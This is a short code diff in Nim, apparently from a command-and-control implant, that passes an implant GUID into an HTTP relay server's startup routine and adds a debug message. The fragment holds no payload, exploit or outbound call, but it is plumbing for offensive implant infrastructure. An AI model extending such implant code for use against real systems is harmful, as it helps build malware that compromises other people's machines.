@@ -10,14 +10,15 @@ import http_relay
 const RELAY_PORT {.intdefine.}: int = 0
 
 # Start HTTP relay server in async mode
-proc startRelayServerAsync*() {.async.} =
+proc startRelayServerAsync*(implantGuid: string) {.async.} =
     when RELAY_PORT > 0:
         when defined debug:
             echo "[RELAY] 🚀 HTTP Relay server configured on port " & $RELAY_PORT
+            echo "[RELAY] 🆔 Using implant GUID: " & implantGuid
         
         # Start relay server in background (non-blocking)
         try:
-            let server = startHttpRelayServer(RELAY_PORT)
+            let server = startHttpRelayServer(RELAY_PORT, implantGuid)
             
             if server.isListening:
                 when defined debug:
